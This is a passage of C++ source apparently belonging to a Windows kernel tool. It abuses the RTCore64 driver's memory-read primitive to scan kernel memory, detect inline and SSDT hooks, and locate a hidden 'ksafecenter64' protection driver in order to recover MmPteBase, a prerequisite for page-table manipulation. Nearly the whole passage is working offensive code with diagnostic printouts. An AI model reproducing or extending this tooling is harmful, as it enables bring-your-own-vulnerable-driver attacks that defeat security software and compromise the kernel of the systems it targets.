                        auto* nt2 = reinterpret_cast<IMAGE_NT_HEADERS64*>(
                                        fbuf.data() + dos2->e_lfanew);
                        if (nt2->Signature == IMAGE_NT_SIGNATURE)
                            ksafeSizeOfImage = nt2->OptionalHeader.SizeOfImage;
                    }
                }
            }
            CloseHandle(hf);
        }
    }

    DWORD64 backBound = ksafeSizeOfImage ? (DWORD64)ksafeSizeOfImage * 2
                                          : 16ULL * 1024 * 1024;
    DWORD64 result = 0;
    std::set<DWORD64> triedBases;

    for (DWORD64 fp : unknownFPs) {
        if (verbose) printf("  [0g] Scanning backward from 0x%016llX\n", fp);
        DWORD64 searchFrom = fp & ~0xFFFULL;
        DWORD64 ksafeBase  = 0;
        for (DWORD64 dist = 0; dist <= backBound; dist += 0x1000) {
            if (dist > searchFrom) break;
            DWORD64 probe = searchFrom - dist;
            if (!g_drv->IsKernelVA(probe)) break;
            if (!IsVaMapped(probe)) continue;  // skip non-present pages — RTCore64 has no SEH
            WORD mz = (WORD)(g_drv->Rd64(probe) & 0xFFFF);
            if (mz == 0x5A4D) {
                WORD e_lfanew = (WORD)((g_drv->Rd64(probe + 0x3C)) & 0xFFFF);
                if (e_lfanew >= 0x40 && e_lfanew <= 0x400) {
                    DWORD peSig = (DWORD)(g_drv->Rd64(probe + e_lfanew) & 0xFFFFFFFF);
                    if (peSig == 0x00004550) {
                        ksafeBase = probe;
                        if (verbose)
                            printf("  [0g] MZ+PE at 0x%016llX\n", probe);
                        break;
                    }
                }
            }
        }
        if (!ksafeBase || triedBases.count(ksafeBase)) continue;
        triedBases.insert(ksafeBase);
        printf("  [0g] Hidden driver base = 0x%016llX\n", ksafeBase);

        bool hasPE = !fbuf.empty();
        if (hasPE) {
            auto* dos2 = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
            auto* nt2  = reinterpret_cast<IMAGE_NT_HEADERS64*>(fbuf.data() + dos2->e_lfanew);
            auto* sec2 = IMAGE_FIRST_SECTION(nt2);
            WORD  ns2  = nt2->FileHeader.NumberOfSections;
            for (WORD si = 0; si < ns2 && si < 96; si++) {
                char sn[9] = {}; memcpy(sn, sec2[si].Name, 8);
                DWORD ch  = sec2[si].Characteristics;
                DWORD rva = sec2[si].VirtualAddress;
                DWORD vsz = sec2[si].Misc.VirtualSize;
                if (!vsz) vsz = sec2[si].SizeOfRawData;
                if (!vsz || vsz > 2*1024*1024) continue;
                if (strncmp(sn, "PAGE", 4) == 0) continue;
                if (strcmp(sn, "INIT") == 0) continue;
                if (strcmp(sn, ".rsrc") == 0 || strcmp(sn, ".reloc") == 0) continue;
                if (ch & IMAGE_SCN_MEM_DISCARDABLE) continue;
                if (!(ch & (IMAGE_SCN_CNT_INITIALIZED_DATA |
                             IMAGE_SCN_CNT_UNINITIALIZED_DATA))) continue;
                DWORD64 secBase = ksafeBase + rva;
                DWORD   nQ      = vsz / 8;
                for (DWORD qi = 0; qi < nQ; qi++) {
                    DWORD64 val = g_drv->Rd64(secBase + qi * 8);
                    if (!g_drv->IsKernelVA(val)) continue;
                    if (val & ALIGN_512G) continue;
                    DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
                    if (pml4 < 256) continue;
                    if (IsKnownConstant(val)) continue;
                    printf("  [0g] %s+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                           sn, qi*8, val, pml4);
                    if (!result) result = val;
                }
            }
        } else {
            DWORD scanSz = ksafeSizeOfImage ? ksafeSizeOfImage : 0x80000;
            for (DWORD qi = 0; qi < scanSz / 8; qi++) {
                DWORD64 val = g_drv->Rd64(ksafeBase + qi * 8);
                if (!g_drv->IsKernelVA(val)) continue;
                if (val & ALIGN_512G) continue;
                DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
                if (pml4 < 256) continue;
                if (IsKnownConstant(val)) continue;
                printf("  [0g] raw+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                       qi*8, val, pml4);
                if (!result) result = val;
            }
        }
        if (result) break;
    }
    return result;
}

// ── Method 0h: ntoskrnl export inline-hook scan → hidden driver → MmPteBase ───
//
// ksafecenter64 intercepts system calls (e.g. NtQuerySystemInformation) to
// hide from EnumDeviceDrivers.  Without an accessible SSDT it does this via
// INLINE HOOKS: the first bytes of the target function are overwritten with
// a JMP to ksafecenter64's trampoline.
//
// We scan every ntoskrnl export from disk:
//   1. Read the first 16 runtime bytes at kBase+RVA.
//   2. Detect JMP rel32 (E9), JMP [RIP+0] (FF 25 00 00 00 00), or
//      MOV r64,imm64 + JMP r64 (48 B8/BA/B9/BB ... FF E0/E2/E1/E3).
//   3. Decode target VA; if outside ntoskrnl's mapped range it's a hook.
//   4. Collect unique hook targets → scan backward for MZ → scan .data.
//
// Safe: we only read from ntoskrnl exports, which are always non-paged.
// ─────────────────────────────────────────────────────────────────────────────
static DWORD64 FindMmPteBaseByInlineHookScan(bool verbose = false) {
    NtoskrnlImage img = LoadNtoskrnl();
    if (!img.ok) return 0;

    static const DWORD64 ALIGN_512G  = (1ULL << 39) - 1;
    static const DWORD64 kFalsePos[] = {
        0xFFFF800000000000ULL, 0xFFFFFE0000000000ULL,
        0xFFFFFF0000000000ULL, 0xFFFF000000000000ULL,
        0xFFFFF80000000000ULL, 0xFFFFFFFFFFFFF000ULL,
    };
    auto IsKnownConstant = [](DWORD64 v) {
        for (auto c : kFalsePos) if (v == c) return true;
        return false;
    };

    LPVOID devs[1024]; DWORD cb;
    if (!EnumDeviceDrivers(devs, sizeof(devs), &cb)) return 0;
    DWORD numDrv = cb / sizeof(LPVOID);
    struct KRange { DWORD64 lo, hi; };
    std::vector<KRange> known;
    known.reserve(numDrv);
    for (DWORD i = 0; i < numDrv; i++) {
        DWORD64 b = (DWORD64)devs[i];
        if (g_drv->IsKernelVA(b)) known.push_back({b, b + 32ULL*1024*1024});
    }
    auto IsKnownAddr = [&](DWORD64 va) {
        for (auto& r : known) if (va >= r.lo && va < r.hi) return true;
        return false;
    };

    // ntoskrnl range for "not hooked" check
    DWORD64 kEnd = img.kBase + img.textRVA + img.textSz + 4*1024*1024; // generous

    // Parse export table from disk image
    const BYTE* buf = img.buf.data();
    auto* dos = reinterpret_cast<const IMAGE_DOS_HEADER*>(buf);
    auto* nt  = reinterpret_cast<const IMAGE_NT_HEADERS64*>(buf + dos->e_lfanew);
    auto& ed  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!ed.VirtualAddress) {
        if (verbose) printf("  [0h] ntoskrnl has no export directory\n");
        return 0;
    }

    // RVA → FOA helper
    auto* sec  = IMAGE_FIRST_SECTION(nt);
    WORD  nSec = nt->FileHeader.NumberOfSections;
    auto rva2foa = [&](DWORD rva) -> DWORD {
        for (WORD i = 0; i < nSec; i++) {
            DWORD vb = sec[i].VirtualAddress;
            DWORD ve = vb + sec[i].SizeOfRawData;
            if (rva >= vb && rva < ve) return sec[i].PointerToRawData + (rva - vb);
        }
        return 0;
    };

    DWORD efoa = rva2foa(ed.VirtualAddress);
    if (!efoa) return 0;
    auto* exp     = reinterpret_cast<const IMAGE_EXPORT_DIRECTORY*>(buf + efoa);
    auto* nameRVAs = reinterpret_cast<const DWORD*>(buf + rva2foa(exp->AddressOfNames));
    auto* ords     = reinterpret_cast<const WORD* >(buf + rva2foa(exp->AddressOfNameOrdinals));
    auto* funcRVAs = reinterpret_cast<const DWORD*>(buf + rva2foa(exp->AddressOfFunctions));

    if (verbose)
        printf("  [0h] Scanning %u ntoskrnl exports for inline hooks...\n",
               exp->NumberOfNames);

    std::vector<DWORD64> hookTargets;
    int hooksFound = 0;

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        DWORD nfoa = rva2foa(nameRVAs[i]);
        if (!nfoa) continue;
        const char* expName = reinterpret_cast<const char*>(buf + nfoa);
        DWORD fnRVA = funcRVAs[ords[i]];

        // Skip forwarded exports (RVA inside export dir)
        if (fnRVA >= ed.VirtualAddress && fnRVA < ed.VirtualAddress + ed.Size) continue;

        DWORD64 fnVA = img.kBase + fnRVA;

        // Read first 16 runtime bytes from kernel
        BYTE bytes[16];
        for (int b2 = 0; b2 < 16; b2 += 8) {
            DWORD64 qw = g_drv->Rd64(fnVA + b2);
            memcpy(bytes + b2, &qw, 8);
        }

        // Decode common hook stubs:
        DWORD64 tgt = 0;
        // 1. JMP rel32: E9 xx xx xx xx
        if (bytes[0] == 0xE9) {
            INT32 rel = *reinterpret_cast<INT32*>(bytes + 1);
            tgt = fnVA + 5 + (INT64)rel;
        }
        // 2. JMP [RIP+0]: FF 25 00 00 00 00 + 8-byte absolute
        else if (bytes[0] == 0xFF && bytes[1] == 0x25 &&
                 *reinterpret_cast<INT32*>(bytes+2) == 0) {
            DWORD64 absAddr = *reinterpret_cast<DWORD64*>(bytes + 6);
            if (g_drv->IsKernelVA(absAddr)) tgt = absAddr;
        }
        // 3. MOV RAX/RCX/RDX/RBX, imm64 + JMP rAX/rCX/rDX/rBX
        //    48 B8 xx xx xx xx xx xx xx xx  FF E0
        //    48 B9 ... FF E1
        //    48 BA ... FF E2
        //    48 BB ... FF E3
        else if (bytes[0] == 0x48 &&
                 (bytes[1] == 0xB8 || bytes[1] == 0xB9 ||
                  bytes[1] == 0xBA || bytes[1] == 0xBB) &&
                 bytes[10] == 0xFF &&
                 (bytes[11] == 0xE0 || bytes[11] == 0xE1 ||
                  bytes[11] == 0xE2 || bytes[11] == 0xE3)) {
            tgt = *reinterpret_cast<DWORD64*>(bytes + 2);
        }

        if (!tgt) continue;
        if (!g_drv->IsKernelVA(tgt)) continue;
        if (tgt >= img.kBase && tgt < kEnd) continue;  // in ntoskrnl — not a hook
        if (IsKnownAddr(tgt)) continue;                 // in a known driver — skip

        hooksFound++;
        if (verbose || hooksFound <= 8)
            printf("  [0h] HOOK: %-48s  fn=0x%016llX  →  0x%016llX\n",
                   expName, fnVA, tgt);
        hookTargets.push_back(tgt);
    }

    if (verbose)
        printf("  [0h] Total hooks to unknown modules: %d\n", hooksFound);

    if (hookTargets.empty()) return 0;

    // Deduplicate and scan backward for MZ
    std::sort(hookTargets.begin(), hookTargets.end());
    hookTargets.erase(std::unique(hookTargets.begin(), hookTargets.end()),
                      hookTargets.end());

    WCHAR sysDrv[MAX_PATH]; GetSystemDirectoryW(sysDrv, MAX_PATH);
    WCHAR ksafePath[MAX_PATH];
    swprintf_s(ksafePath, MAX_PATH, L"%s\\drivers\\ksafecenter64.sys", sysDrv);
    std::vector<BYTE> fbuf;
    DWORD ksafeSizeOfImage = 0;
    {
        HANDLE hf = CreateFileW(ksafePath, GENERIC_READ, FILE_SHARE_READ,
                                nullptr, OPEN_EXISTING, 0, nullptr);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD fsz = GetFileSize(hf, nullptr);
            if (fsz >= 0x200 && fsz <= 32*1024*1024) {
                fbuf.resize(fsz);
                DWORD rd;
                if (ReadFile(hf, fbuf.data(), fsz, &rd, nullptr) && rd == fsz) {
                    auto* dos2 = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
                    if (dos2->e_magic == IMAGE_DOS_SIGNATURE) {
                        auto* nt2 = reinterpret_cast<IMAGE_NT_HEADERS64*>(
                                        fbuf.data() + dos2->e_lfanew);
                        if (nt2->Signature == IMAGE_NT_SIGNATURE)
                            ksafeSizeOfImage = nt2->OptionalHeader.SizeOfImage;
                    }
                }
            }
            CloseHandle(hf);
        }
    }

    DWORD64 backBound = ksafeSizeOfImage ? (DWORD64)ksafeSizeOfImage * 2
                                          : 16ULL * 1024 * 1024;
    DWORD64 result = 0;
    std::set<DWORD64> triedBases;

    for (DWORD64 fp : hookTargets) {
        DWORD64 searchFrom = fp & ~0xFFFULL;
        DWORD64 ksafeBase  = 0;
        for (DWORD64 dist = 0; dist <= backBound; dist += 0x1000) {
            if (dist > searchFrom) break;
            DWORD64 probe = searchFrom - dist;
            if (!g_drv->IsKernelVA(probe)) break;
            if (!IsVaMapped(probe)) continue;  // skip non-present pages — RTCore64 has no SEH
            WORD mz = (WORD)(g_drv->Rd64(probe) & 0xFFFF);
            if (mz == 0x5A4D) {
                WORD e_lfanew = (WORD)((g_drv->Rd64(probe + 0x3C)) & 0xFFFF);
                if (e_lfanew >= 0x40 && e_lfanew <= 0x400) {
                    DWORD peSig = (DWORD)(g_drv->Rd64(probe + e_lfanew) & 0xFFFFFFFF);
                    if (peSig == 0x00004550) {
                        ksafeBase = probe;
                        if (verbose)
                            printf("  [0h] MZ+PE at 0x%016llX\n", probe);
                        break;
                    }
                }
            }
        }
        if (!ksafeBase || triedBases.count(ksafeBase)) continue;
        triedBases.insert(ksafeBase);
        printf("  [0h] Hidden driver base = 0x%016llX\n", ksafeBase);

        bool hasPE = !fbuf.empty();
        if (hasPE) {
            auto* dos2 = reinterpret_cast<IMAGE_DOS_HEADER*>(fbuf.data());
            auto* nt2  = reinterpret_cast<IMAGE_NT_HEADERS64*>(fbuf.data() + dos2->e_lfanew);
            auto* sec2 = IMAGE_FIRST_SECTION(nt2);
            WORD  ns2  = nt2->FileHeader.NumberOfSections;
            for (WORD si = 0; si < ns2 && si < 96; si++) {
                char sn[9] = {}; memcpy(sn, sec2[si].Name, 8);
                DWORD ch  = sec2[si].Characteristics;
                DWORD rva = sec2[si].VirtualAddress;
                DWORD vsz = sec2[si].Misc.VirtualSize;
                if (!vsz) vsz = sec2[si].SizeOfRawData;
                if (!vsz || vsz > 2*1024*1024) continue;
                if (strncmp(sn, "PAGE", 4) == 0) continue;
                if (strcmp(sn, "INIT") == 0) continue;
                if (strcmp(sn, ".rsrc") == 0 || strcmp(sn, ".reloc") == 0) continue;
                if (ch & IMAGE_SCN_MEM_DISCARDABLE) continue;
                if (!(ch & (IMAGE_SCN_CNT_INITIALIZED_DATA |
                             IMAGE_SCN_CNT_UNINITIALIZED_DATA))) continue;
                DWORD64 secBase = ksafeBase + rva;
                DWORD   nQ      = vsz / 8;
                for (DWORD qi = 0; qi < nQ; qi++) {
                    DWORD64 val = g_drv->Rd64(secBase + qi * 8);
                    if (!g_drv->IsKernelVA(val)) continue;
                    if (val & ALIGN_512G) continue;
                    DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
                    if (pml4 < 256) continue;
                    if (IsKnownConstant(val)) continue;
                    printf("  [0h] %s+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                           sn, qi*8, val, pml4);
                    if (!result) result = val;
                }
            }
        } else {
            DWORD scanSz = ksafeSizeOfImage ? ksafeSizeOfImage : 0x80000;
            for (DWORD qi = 0; qi < scanSz / 8; qi++) {
                DWORD64 val = g_drv->Rd64(ksafeBase + qi * 8);
                if (!g_drv->IsKernelVA(val)) continue;
                if (val & ALIGN_512G) continue;
                DWORD pml4 = (DWORD)((val >> 39) & 0x1FF);
                if (pml4 < 256) continue;
                if (IsKnownConstant(val)) continue;
                printf("  [0h] raw+0x%04X = 0x%016llX  PML4[%u]  *** MmPteBase ***\n",
                       qi*8, val, pml4);
                if (!result) result = val;
            }
        }
        if (result) break;
    }
    return result;
}

// ── Method 2: highest-reference-count .data global ───────────────────────────
//
// Scan ntoskrnl.exe on disk for the most-referenced .data global
// (MOV r64,[RIP+offset] pointing into .data).
// On Windows 10 22H2, MmPteBase at RVA 0xC124D0 has ~1302 references —
// far more than any other global — making it unambiguous.
//
// MmPteBase is always 512 GB-aligned (self-referential PML4 entry occupies a
// whole 512 GB slot), so we additionally require:
//   val & ((1 << 39) - 1) == 0   (bits [38:0] are all zero)
//
// Returns the kernel VA of the MmPteBase *variable* (not its value).
static DWORD64 FindMmPteBaseByRefScan(const NtoskrnlImage& img) {
    if (!img.ok) return 0;
    const BYTE* buf = img.buf.data();

    // Count RIP-relative 64-bit loads (MOV r64,[RIP+imm32]) targeting any data section.
    // Scan ALL executable sections: on some ntoskrnl builds PTE helpers live in PAGE,
    // not .text, so a .text-only scan misses the dominant MmPteBase references.
    std::map<DWORD, int> refCnt;
    for (auto& esec : img.execSecs) {
        DWORD end = esec.foa + esec.sz;
        for (DWORD i = esec.foa; i + 7 < end; i++) {
            DWORD rva = DecodeRipRelDataRef(buf, i, esec.foa, esec.rva, img.dataRVA, img.dataEnd);
            if (rva) refCnt[rva]++;
        }
    }
    if (refCnt.empty()) return 0;

    // Collect top-64 candidates by reference count.
    // We cannot safely assume the single most-referenced variable is MmPteBase —
    // on some patch levels another high-frequency .data global can outrank it.
    // Filter: runtime value must be a canonical kernel VA AND 512 GB-aligned.
    std::vector<std::pair<int,DWORD>> topN;
    topN.reserve(refCnt.size());
    for (auto& kv : refCnt) topN.push_back({kv.second, kv.first});
    std::sort(topN.begin(), topN.end(), [](auto& a, auto& b){ return a.first > b.first; });
    if (topN[0].first < 10) return 0;  // nothing looks plausible

    static const DWORD64 ALIGN_512G = (1ULL << 39) - 1;  // bits [38:0]

    for (size_t rank = 0; rank < topN.size() && rank < 64; rank++) {
        DWORD   rva   = topN[rank].second;
        int     cnt   = topN[rank].first;
        DWORD64 varVA = img.kBase + rva;
        DWORD64 val   = g_drv->Rd64(varVA);

        if (!g_drv->IsKernelVA(val)) {
            if (g_debug) printf("[pte] refcnt skip RVA=0x%08X refs=%d val=0x%016llX (not kernel VA)\n", rva, cnt, val);
            continue;
        }
        if (val & ALIGN_512G) {
            // Not 512 GB-aligned — cannot be MmPteBase.  Previously this check
            // was only 4 KB alignment which admitted false positives.
            if (g_debug) printf("[pte] refcnt skip RVA=0x%08X refs=%d val=0x%016llX (not 512GB-aligned)\n", rva, cnt, val);
            continue;
        }
        printf("[pte] MmPteBase refcnt: RVA=0x%08X refs=%d rank=%zu  value=0x%016llX\n",
               rva, cnt, rank, val);
        return varVA;
    }
    printf("[pte] MmPteBase refcnt: no valid candidate in top-64\n");
    return 0;
}

DWORD64 GetMmPteBase() {
    if (s_pteBase) return s_pteBase;

    // ── Load ntoskrnl image once for all disk-scan methods ───────────────────
    NtoskrnlImage img = LoadNtoskrnl();

    // ── Method 0a: CR3 → MapPhys → PML4 self-reference (hardware level) ────────
    // Completely bypasses kernel globals — requires MapPhys IOCTL support.
    {
        DWORD64 val = FindMmPteBaseByCR3Walk();
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 0b: CR3/MmPfnDatabase physical walk ───────────────────────────
    // Fallback for when MapPhys is unsupported. Does not depend on MmPteBase.
    {
        DWORD64 val = FindMmPteBaseByPhysWalk(img);
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 0h: ntoskrnl export inline-hook scan → hidden driver → .data ───
    {
        DWORD64 val = FindMmPteBaseByInlineHookScan(false);
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 0g: SSDT hook scan → hooked fn VA → MZ scan → .data ─────────────
    {
        DWORD64 val = FindMmPteBaseBySSdtScan(false);
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 0f: callback array scan → hidden driver FP → MZ scan → .data ────
    {
        DWORD64 val = FindMmPteBaseByCallbackScan(false);
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 0e: object directory → ksafecenter64 DRIVER_OBJECT → scan ───────
    {
        DWORD64 val = FindMmPteBaseByObjDir(false);
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 0d: walk PsLoadedModuleList → find ksafecenter64 → scan .data ───
    {
        DWORD64 val = FindMmPteBaseByLdrList(false);
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 0c: scan loaded kernel drivers for stored copy of MmPteBase ─────
    {
        DWORD64 val = FindMmPteBaseByDriverScan(false);
        if (val && g_drv->IsKernelVA(val)) {
            s_pteBase = val;
            return s_pteBase;
        }
    }

    // ── Method 1: ntoskrnl export (present on a handful of early RS builds) ──
    DWORD64 varVA = KUtil::KernelExport("MmPteBase");
    const char* method = "export";

    if (!varVA) {
        // ── Method 2 & 3: disk-scan heuristics ───────────────────────────────

        // 2. Highest-reference-count .data global (512 GB-aligned filter)
        varVA = FindMmPteBaseByRefScan(img);
        if (varVA) method = "refcnt scan";

        // 3. MiGetPteAddress code-pattern scan (ADD r64,[rip+X] near sar r64,9)
        if (!varVA) {
            varVA = FindMmPteBaseByMiGetPtePattern(img);
            if (varVA) method = "MiGetPteAddr pattern";
        }
    }

    if (!varVA) {
        printf("[pte] MmPteBase: all scan methods failed — use /ptebase-set\n");
        return 0;
    }

    DWORD64 base = g_drv->Rd64(varVA);
    if (!g_drv->IsKernelVA(base)) {
        printf("[pte] MmPteBase value 0x%016llX is not a kernel VA\n", base);
        return 0;
    }

    printf("[pte] MmPteBase = 0x%016llX (via %s)\n", base, method);
    s_pteBase = base;
    return s_pteBase;
}

void SetMmPteBase(DWORD64 val) {
    s_pteBase = val;
    printf("[pte] MmPteBase manually set to 0x%016llX\n", val);
}

// Print full diagnostic for all scan methods — for debugging when scan fails.
void CmdPteBaseScan() {
    NtoskrnlImage img = LoadNtoskrnl();
    if (!img.ok) { printf("[!] Failed to load ntoskrnl.exe\n"); return; }

    // ── Section 0h: inline hook scan ───────────────────────────────────────────
    printf("=== Method 0h: ntoskrnl export inline-hook scan ===\n\n");
    {
        DWORD64 v = FindMmPteBaseByInlineHookScan(true);
        if (v)
            printf("\n  >>> Method 0h RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
        else
            printf("  (method 0h found no candidate)\n\n");
    }

    // ── Section 0g: SSDT hook scan ────────────────────────────────────────────
    printf("=== Method 0g: SSDT hook scan (KeServiceDescriptorTable) ===\n\n");
    {
        DWORD64 v = FindMmPteBaseBySSdtScan(true);
        if (v)
            printf("\n  >>> Method 0g RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
        else
            printf("  (method 0g found no candidate)\n\n");
    }

    // ── Section 0f: callback array scan ──────────────────────────────────────
    printf("=== Method 0f: Kernel callback array scan (LoadImage/Proc/Thread notify) ===\n\n");
    {
        DWORD64 v = FindMmPteBaseByCallbackScan(true);
        if (v)
            printf("\n  >>> Method 0f RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
        else
            printf("  (method 0f found no candidate)\n\n");
    }

    // ── Section 0a: DISABLED (BSOD confirmed) ────────────────────────────────
    printf("=== Method 0a: PML4 brute-force — DISABLED (BSOD 0x50 confirmed) ===\n");
    printf("  RTCore64 raw-deref causes PAGE_FAULT on unmapped PTE VAs.\n");
    printf("  Need safe physical read path before re-enabling.\n\n");

    // ── Section 0d: PsLoadedModuleList walk → ksafecenter64 .data scan ──────────
    printf("=== Method 0d: PsLoadedModuleList walk → ksafecenter64 .data scan ===\n\n");
    {
        DWORD64 v = FindMmPteBaseByLdrList(true);
        if (v)
            printf("\n  >>> Method 0d RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
        else
            printf("  (method 0d found no candidate)\n\n");
    }

    // ── Section 0e: Object directory walk ────────────────────────────────────
    printf("=== Method 0e: Object directory \\Driver\\ksafecenter64 → DriverStart ===\n\n");
    {
        DWORD64 v = FindMmPteBaseByObjDir(true);
        if (v)
            printf("\n  >>> Method 0e RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
        else
            printf("  (method 0e found no candidate)\n\n");
    }

    // ── Section 0c: Kernel driver memory scan ────────────────────────────────
    printf("=== Method 0c: Kernel driver non-pageable data scan ===\n\n");
    {
        DWORD64 v = FindMmPteBaseByDriverScan(true);
        if (v)
            printf("\n  >>> Method 0c RESULT: MmPteBase = 0x%016llX <<<\n\n", v);
        else
            printf("  (method 0c found no candidate)\n\n");
    }

    // ── Section 0b: CR3/MmPfnDatabase physical walk ──────────────────────────
    printf("=== Method 0b: CR3 / MmPfnDatabase physical walk ===\n\n");
    {
        DWORD64 sysEP = g_drv->Rd64(KUtil::KernelExport("PsInitialSystemProcess"));
        if (!g_drv->IsKernelVA(sysEP)) {
            printf("  [!] PsInitialSystemProcess unavailable\n\n");
        } else {
            DWORD64 cr3 = g_drv->Rd64(sysEP + 0x28);
            DWORD64 pfn = cr3 >> 12;

            // MmPfnDatabase: export first, then pattern scan
            DWORD64 pfnDbVar  = KUtil::KernelExport("MmPfnDatabase");
            DWORD64 pfnArray  = pfnDbVar ? g_drv->Rd64(pfnDbVar) : 0;
            const char* pfnSrc = "export";
            if (!g_drv->IsKernelVA(pfnArray)) {
                pfnArray = FindMmPfnDatabaseByPattern(img);
                pfnSrc   = "pattern scan";
                if (!pfnArray) pfnSrc = "NOT FOUND";
            }

            printf("  System EPROCESS:          0x%016llX\n", sysEP);
            printf("  DirectoryTableBase (CR3): 0x%016llX  (PFN = 0x%llX)\n", cr3, pfn);
            printf("  MmPfnDatabase (%s): array @ 0x%016llX\n", pfnSrc, pfnArray);

            if (g_drv->IsKernelVA(pfnArray)) {
                static const DWORD kStrides[] = { 0x28, 0x30, 0x38, 0x40 };
                static const DWORD64 ALIGN_512G = (1ULL << 39) - 1;

                // ── Candidate validation: dump PFN[0..3] ──────────────────
                // If MmPfnDatabase is correct, early PFN entries (physical pages
                // 0–3) must be non-zero (they are used by firmware/hardware).
                // All-zeros there means the candidate is WRONG.
                printf("\n  Candidate validation — PFN[0..3] raw entries (stride=0x30):\n");
                bool anyNonZero = false;
                for (DWORD checkPfn = 0; checkPfn <= 3; checkPfn++) {
                    DWORD64 ev = pfnArray + checkPfn * 0x30;
                    printf("    PFN[%u] VA=0x%016llX: ", checkPfn, ev);
                    bool rowNonZero = false;
                    for (DWORD off = 0; off < 0x30; off += 8) {
                        DWORD64 v = g_drv->Rd64(ev + off);
                        if (v) rowNonZero = true;
                    }
                    anyNonZero |= rowNonZero;
                    printf("%s\n", rowNonZero ? "NON-ZERO (good)" : "ALL ZERO (suspicious)");
                }
                printf("  Candidate is %s\n",
                       anyNonZero ? "PLAUSIBLE (early PFN entries non-zero)"
                                  : "LIKELY WRONG (all early PFN entries zero)");

                // Dump raw PFN entry QWORDs for the largest stride (0x40 covers all)
                DWORD64 baseEntry = pfnArray + pfn * 0x40;
                printf("\n  Raw PFN[0x%llX] entry (stride=0x40, VA=0x%016llX):\n",
                       pfn, baseEntry);
                for (DWORD off = 0; off < 0x40; off += 8) {
                    DWORD64 v = g_drv->Rd64(baseEntry + off);
                    const char* note = "";
                    if (g_drv->IsKernelVA(v)) {
                        DWORD64 c = v & ~ALIGN_512G;
                        if (g_drv->IsKernelVA(c) && !(c & ALIGN_512G))
                            note = "  <-- 512GB-aligned => MmPteBase candidate!";
                        else
                            note = "  (kernel VA)";
                    }
                    printf("    +0x%02X: 0x%016llX%s\n", off, v, note);
                }

                // Try all stride × offset combinations
                printf("\n  Stride x Offset search:\n");
                for (DWORD stride : kStrides) {
                    DWORD64 entry = pfnArray + pfn * stride;
                    for (DWORD off = 0x00; off < stride; off += 8) {
                        DWORD64 v = g_drv->Rd64(entry + off);
                        if (!g_drv->IsKernelVA(v)) continue;
                        DWORD64 c = v & ~ALIGN_512G;
                        if (!g_drv->IsKernelVA(c) || (c & ALIGN_512G)) continue;
                        printf("    stride=0x%02X off=+0x%02X  pteAddr=0x%016llX  MmPteBase=0x%016llX  *** CANDIDATE ***\n",
                               stride, off, v, c);
                    }
                }
                printf("\n");
            } else {
                printf("  (MmPfnDatabase not found — skipping PFN walk)\n\n");
            }
        }
    }

    const BYTE* buf = img.buf.data();

    printf("[pte] ntoskrnl base = 0x%016llX\n", img.kBase);
    printf("[pte] .text RVA=0x%08X  .data RVA=0x%08X..0x%08X\n\n",
           img.textRVA, img.dataRVA, img.dataEnd);

    // ── Section 1: MiGetPteAddress pattern scan ───────────────────────────────
    printf("=== Method 1: MiGetPteAddress code pattern (sar r64,9 anchor) ===\n\n");
    {
        std::map<DWORD, int> hits;
        DWORD end = img.textFOA + img.textSz;
        int anchors = 0;
        for (DWORD i = img.textFOA; i + 4 < end; i++) {
            if ((buf[i] != 0x48 && buf[i] != 0x49) || buf[i+1] != 0xC1) continue;
            BYTE shiftAmt = buf[i+3];
            if (shiftAmt != 0x09 && shiftAmt != 0x0C) continue;
            BYTE modrm = buf[i+2];
            if ((modrm & 0xF8) != 0xF8 && (modrm & 0xF8) != 0xE8) continue;
            anchors++;
            DWORD wStart = (i > img.textFOA + 8) ? (i - 8) : img.textFOA;
            DWORD wEnd   = ((i + 56 + 7) < end)  ? (i + 56) : (end - 7);
            for (DWORD j = wStart; j < wEnd; j++) {
                if (j + 6 >= end) continue;
                BYTE rex = buf[j], op = buf[j+1], modrm = buf[j+2];
                if (rex != 0x48 && rex != 0x4C) continue;
                if (op != 0x03) continue; // ADD only
                if ((modrm & 0xC7) != 0x05) continue;
                INT32 off32    = *reinterpret_cast<const INT32*>(&buf[j + 3]);
                DWORD instrRVA = (j - img.textFOA) + img.textRVA;
                DWORD targetRVA = (DWORD)((INT64)instrRVA + 7 + off32);
                if (targetRVA >= img.dataRVA && targetRVA < img.dataEnd)
                    hits[targetRVA]++;
            }
        }
        printf("  shift-right-by-9/12 anchors found: %d\n\n", anchors);

        std::vector<std::pair<int,DWORD>> ranked;
        for (auto& kv : hits) ranked.push_back({kv.second, kv.first});
        std::sort(ranked.begin(), ranked.end(), [](auto& a, auto& b){ return a.first > b.first; });

        printf("  %-10s  %-6s  %-18s  %s\n", "RVA", "Hits", "RuntimeValue", "Status");
        printf("  %-10s  %-6s  %-18s  %s\n", "----------", "------", "------------------", "------");
        for (auto& [cnt, rva] : ranked) {
            DWORD64 val = g_drv->Rd64(img.kBase + rva);
            const char* status;
            if (!g_drv->IsKernelVA(val))             status = "not-kernel-VA";
